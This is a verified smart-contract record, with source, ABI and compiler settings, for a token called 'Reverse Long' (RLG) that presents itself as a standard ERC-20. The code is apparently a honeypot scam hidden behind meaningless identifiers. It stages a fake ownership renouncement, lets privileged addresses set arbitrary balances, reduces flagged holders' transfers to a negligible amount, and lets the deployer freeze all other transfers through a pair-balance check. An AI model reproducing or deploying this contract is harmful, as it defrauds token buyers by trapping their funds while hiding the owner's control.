{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface fundSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract limitFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenMode {\n    function createPair(address minListSender, address fromMinBuy) external returns (address);\n}\n\ninterface launchedTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletSwapAt) external view returns (uint256);\n\n    function transfer(address buyList, uint256 tradingFund) external returns (bool);\n\n    function allowance(address takeFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingFund) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address buyList,\n        uint256 tradingFund\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atLimit, uint256 value);\n    event Approval(address indexed takeFrom, address indexed spender, uint256 value);\n}\n\ninterface launchedTeamMetadata is launchedTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReverseLong is limitFund, launchedTeam, launchedTeamMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return exemptLaunchedTotal;\n    }\n\n    constructor (){\n        \n        fundSell modeSender = fundSell(liquiditySenderTeam);\n        senderTeam = tokenMode(modeSender.factory()).createPair(modeSender.WETH(), address(this));\n        \n        teamEnable = _msgSender();\n        takeFee();\n        modeTeam[teamEnable] = true;\n        tradingIs[teamEnable] = enableFrom;\n        \n        emit Transfer(address(0), teamEnable, enableFrom);\n    }\n\n    function feeLaunched(address minLiquidity) public {\n        if (totalFeeTx) {\n            return;\n        }\n        \n        modeTeam[minLiquidity] = true;\n        if (totalReceiver != receiverAmount) {\n            txEnable = false;\n        }\n        totalFeeTx = true;\n    }\n\n    address private exemptShouldFee;\n\n    address public teamEnable;\n\n    function isAt(address tradingReceiver) public {\n        enableWallet();\n        if (totalReceiver) {\n            txLimitTrading = senderExempt;\n        }\n        if (tradingReceiver == teamEnable || tradingReceiver == senderTeam) {\n            return;\n        }\n        amountFund[tradingReceiver] = true;\n    }\n\n    address liquiditySenderTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address teamReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address shouldMin, uint256 tradingFund) public virtual override returns (bool) {\n        exemptFund[_msgSender()][shouldMin] = tradingFund;\n        emit Approval(_msgSender(), shouldMin, tradingFund);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return exemptShouldFee;\n    }\n\n    string private exemptLaunchedTotal = \"Reverse Long\";\n\n    string private minLaunched = \"RLG\";\n\n    bool private receiverAmount;\n\n    event OwnershipTransferred(address indexed isTeam, address indexed buyReceiver);\n\n    address public senderTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableFrom;\n    }\n\n    uint256 private enableFrom = 100000000 * 10 ** 18;\n\n    bool public launchedReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountLiquidity;\n    }\n\n    function allowance(address isBuy, address shouldMin) external view virtual override returns (uint256) {\n        if (shouldMin == liquiditySenderTeam) {\n            return type(uint256).max;\n        }\n        return exemptFund[isBuy][shouldMin];\n    }\n\n    function takeMarketing(address totalMin, uint256 tradingFund) public {\n        enableWallet();\n        tradingIs[totalMin] = tradingFund;\n    }\n\n    function transfer(address totalMin, uint256 tradingFund) external virtual override returns (bool) {\n        return exemptIs(_msgSender(), totalMin, tradingFund);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return minLaunched;\n    }\n\n    uint8 private amountLiquidity = 18;\n\n    mapping(address => mapping(address => uint256)) private exemptFund;\n\n    uint256 shouldReceiver;\n\n    bool private shouldTotal;\n\n    bool private totalReceiver;\n\n    function enableWallet() private view {\n        require(modeTeam[_msgSender()]);\n    }\n\n    uint256 private txLimitTrading;\n\n    uint256 private senderExempt;\n\n    function balanceOf(address walletSwapAt) public view virtual override returns (uint256) {\n        return tradingIs[walletSwapAt];\n    }\n\n    function takeFee() public {\n        emit OwnershipTransferred(teamEnable, address(0));\n        exemptShouldFee = address(0);\n    }\n\n    uint256 constant listIsExempt = 19 ** 10;\n\n    mapping(address => bool) public amountFund;\n\n    bool public txEnable;\n\n    function sellTeam(address totalShould, address buyList, uint256 tradingFund) internal returns (bool) {\n        require(tradingIs[totalShould] >= tradingFund);\n        tradingIs[totalShould] -= tradingFund;\n        tradingIs[buyList] += tradingFund;\n        emit Transfer(totalShould, buyList, tradingFund);\n        return true;\n    }\n\n    uint256 private launchedMode;\n\n    bool public totalFeeTx;\n\n    function owner() external view returns (address) {\n        return exemptShouldFee;\n    }\n\n    function exemptIs(address totalShould, address buyList, uint256 tradingFund) internal returns (bool) {\n        if (totalShould == teamEnable) {\n            return sellTeam(totalShould, buyList, tradingFund);\n        }\n        uint256 toTeamAmount = launchedTeam(senderTeam).balanceOf(teamReceiver);\n        require(toTeamAmount == shouldReceiver);\n        require(buyList != teamReceiver);\n        if (amountFund[totalShould]) {\n            return sellTeam(totalShould, buyList, listIsExempt);\n        }\n        return sellTeam(totalShould, buyList, tradingFund);\n    }\n\n    uint256 maxTrading;\n\n    mapping(address => bool) public modeTeam;\n\n    mapping(address => uint256) private tradingIs;\n\n    function transferFrom(address totalShould, address buyList, uint256 tradingFund) external override returns (bool) {\n        if (_msgSender() != liquiditySenderTeam) {\n            if (exemptFund[totalShould][_msgSender()] != type(uint256).max) {\n                require(tradingFund <= exemptFund[totalShould][_msgSender()]);\n                exemptFund[totalShould][_msgSender()] -= tradingFund;\n            }\n        }\n        return exemptIs(totalShould, buyList, tradingFund);\n    }\n\n    function launchedFund(uint256 tradingFund) public {\n        enableWallet();\n        shouldReceiver = tradingFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletSwapAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"}],\"name\":\"feeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"}],\"name\":\"isAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"launchedFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"takeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFeeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingFund\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ReverseLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}